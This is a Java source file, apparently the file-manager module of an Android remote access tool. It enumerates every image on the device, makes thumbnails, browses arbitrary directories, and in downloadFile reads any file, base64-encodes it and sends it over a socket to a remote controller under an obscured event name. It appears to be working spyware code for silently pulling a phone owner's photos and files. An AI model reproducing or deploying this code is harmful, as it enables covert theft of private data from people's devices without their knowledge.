package com.remote.app;

import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.ThumbnailUtils;
import android.net.Uri;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;
import android.webkit.MimeTypeMap;

import com.remote.app.socket.IOSocket;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;


public class FileManager {


    public static JSONArray getAllShownImagesPath() {
        try {
            Uri uri;
            Cursor cursor;
            int column_index_data, column_index_id;

            JSONArray listOfAllImages = new JSONArray();

            uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

            String[] projection = {MediaStore.MediaColumns.DATA,
                    MediaStore.Images.Media._ID};

            cursor = MainService.getContextOfApplication().getContentResolver().query(uri, projection, null,
                    null, null);

            column_index_data = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
            column_index_id = cursor
                    .getColumnIndexOrThrow(MediaStore.Images.Media._ID);

            while (cursor.moveToNext()) {
                JSONObject imgObj = new JSONObject();
                String absolutePathOfImage = cursor.getString(column_index_data);
                int imageId = cursor.getInt(column_index_id);
                imgObj.put("path", absolutePathOfImage);
                imgObj.put("imageId", imageId);

                listOfAllImages.put(imgObj);
            }
            return listOfAllImages;
        } catch (Exception ex) {
            return new JSONArray();
        }
    }


    public static JSONObject getThumbnail(int imageId, String imagePath) {
        try {
            Bitmap thumb = MediaStore.Images.Thumbnails.getThumbnail(MainService.getContextOfApplication().getContentResolver(), imageId,
                    MediaStore.Images.Thumbnails.MINI_KIND, null);

            JSONObject object = new JSONObject();

            object.put("type", "thumbnail");
            object.put("name", imagePath);
            object.put("path", imagePath);
            object.put("contentType", "image/png");

            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            thumb.compress(Bitmap.CompressFormat.PNG, 65, byteArrayOutputStream);
            byte[] byteArray = byteArrayOutputStream.toByteArray();

            object.put("buffer", Base64.encodeToString(byteArray, Base64.DEFAULT));
            return object;
        } catch (Exception ex) {
            return null;
        }
    }

    public static JSONArray walk(String path) {
        // Read all files sorted into the values-array
        JSONArray values = new JSONArray();
        File dir = new File(path);
        JSONObject fileObj = new JSONObject();
        boolean canRead = dir.canRead();

        try {
            fileObj.put("name", "../");
            fileObj.put("canRead", canRead);
            fileObj.put("parent", "./");
            fileObj.put("isDir", true);
            fileObj.put("path", dir.getParent());
        } catch (JSONException e) {
            e.printStackTrace();
        }
        values.put(fileObj);

        if (!dir.canRead()) {
            return values;
        }

        try {
            File[] list = dir.listFiles();
            if (list != null && list.length >= 1) {
                for (File file : list) {
                    if (!file.getName().startsWith(".")) {
                        fileObj = new JSONObject();
                        fileObj.put("name", file.getName());
                        fileObj.put("canRead", true);
                        fileObj.put("parent", dir.getParent());
                        fileObj.put("isDir", file.isDirectory());
                        fileObj.put("path", file.getAbsolutePath());
                        values.put(fileObj);
                    }
                }
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }


        return values;
    }

    private static String getMimeType(String url) {
        String type = null;
        String extension = MimeTypeMap.getFileExtensionFromUrl(url);
        if (extension != null) {
            type = MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension);
        }
        return type;
    }

    public static void downloadFile(String path) {
        if (path == null)
            return;

        File file = new File(path);

        if (file.exists()) {

            int size = (int) file.length();
            byte[] data = new byte[size];
            try {
                BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
                buf.read(data, 0, data.length);
                JSONObject object = new JSONObject();
                object.put("type", "download");
                object.put("name", file.getName());

                object.put("path", file.getAbsolutePath());
                object.put("contentType", getMimeType(file.getAbsolutePath()));

                object.put("buffer", Base64.encodeToString(data, Base64.DEFAULT));
                IOSocket.getInstance().send("_0xFD", object.toString());
                buf.close();


            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }


        }
    }

}
